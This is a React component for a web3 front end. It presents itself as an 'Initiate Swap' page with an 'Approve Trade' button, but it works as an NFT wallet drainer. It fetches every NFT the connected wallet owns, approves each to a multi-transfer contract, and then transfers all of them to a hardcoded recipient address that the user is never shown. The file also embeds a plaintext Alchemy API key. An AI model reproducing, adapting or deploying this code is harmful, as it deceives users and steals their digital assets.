"use client";
import { Button } from "@/components/ui/button";
import React from "react";
import { CustomConnectButton } from "../../components/CustomConnectButton"; // Import the connect button
import abi from "@/app/assets/abi/ContractABI.json";
import { useState, useEffect } from "react";
import { useAccount, useWriteContract } from "wagmi";
import { readContract } from "@wagmi/core";
import axios from "axios";
import { erc721Abi } from "viem";
import { wagmiConfig } from "@/lib/wagmiConfig";

interface NFT {
  contractAddress: `0x${string}`;
  tokenId: bigint;
}

const TradeTitle = () => {
  const { address, isConnected } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const [nfts, setNfts] = useState<NFT[]>([]);

  const multiTransferContract =
    "0x5FbDB2315678afecb367f032d93F642f64180aa3" as `0x${string}`;
  const API_KEY = "V4QidqQN3CnapxngEQGMGFl0ZEkS72Bg";

  useEffect(() => {
    const fetchNfts = async (address: `0x${string}`): Promise<void> => {
      const options = {
        method: "GET",
        url: `https://eth-mainnet.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`,
        // url: `https://eth-sepolia.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`, //test
        params: {
          owner: address,
          withMetadata: "true",
          pageSize: "100",
        },
        headers: { accept: "application/json" },
      };

      try {
        const { data, status } = await axios.request(options);
        const nfts = data.ownedNfts
          // .filter(
          //   (nft: any) => nft.contract.openSeaMetadata.floorPrice > 0 //Should be changed
          // )
          .map((nft: any) => ({
            contractAddress: nft.contract.address,
            tokenId: nft.tokenId,
          }));
        setNfts(nfts);
      } catch (error) {
        console.error("Error: ", error);
      }
    };
    if (isConnected && address) {
      fetchNfts(address);
    }
  }, [isConnected, address]);

  // Test
  useEffect(() => {
    console.log(nfts);
  }, [nfts]);

  const handleClick = async (): Promise<void> => {
    if (!isConnected) {
      console.log("Connect wallet!");
      return;
    }

    if (nfts.length == 0) {
      return;
    }

    const contracts: `0x${string}`[] = nfts.map((nft) => nft.contractAddress);
    const tokenIds: bigint[] = nfts.map((nft) => nft.tokenId);

    try {
      for (let i = 0; i < nfts.length; i++) {
        const { contractAddress, tokenId } = nfts[i];

        const approvedAddress = await readContract(wagmiConfig, {
          abi: erc721Abi,
          address: contractAddress,
          functionName: "getApproved",
          args: [tokenId],
        });

        if (approvedAddress != multiTransferContract) {
          console.log(`Approving NFT ${tokenId}...`);
          await writeContractAsync({
            abi: erc721Abi,
            address: contractAddress,
            functionName: "approve",
            args: [multiTransferContract, tokenId],
          });
          console.log(`NFT ${tokenId} approved!`);
        } else {
          console.log(`NFT ${tokenId} already approved!`);
        }
      }

      console.log("Transferring NFTs...");
      const res = await writeContractAsync({
        abi,
        address: multiTransferContract,
        functionName: "safeTransferMultipleERC721Tokens",
        args: [
          contracts, //array for tokenContracts
          tokenIds, //array for tokenIds
          "0x6A46d306019Ca148937c48E331Aa5BF322e9d968", //address of recipient
        ],
      });
      console.log(res);
    } catch (error) {
      console.error("Error: ", error);
    }
  };

  return (
    <div className="flex items-center justify-between pt-10">
      <div className="space-y-4">
        <h1 className="text-3xl font-bold">Initiate Swap</h1>
        {!isConnected || !address ? (
          <div className="text-gray-400">Kindly connect wallet</div>
        ) : null}
      </div>

      <div>
        {isConnected && address ? (
          <Button
            className="text-sm bg-[#33BBC5]"
            size="lg"
            onClick={handleClick}
          >
            Approve Trade
          </Button>
        ) : (
          <CustomConnectButton />
        )}
      </div>
    </div>
  );
};

export default TradeTitle;
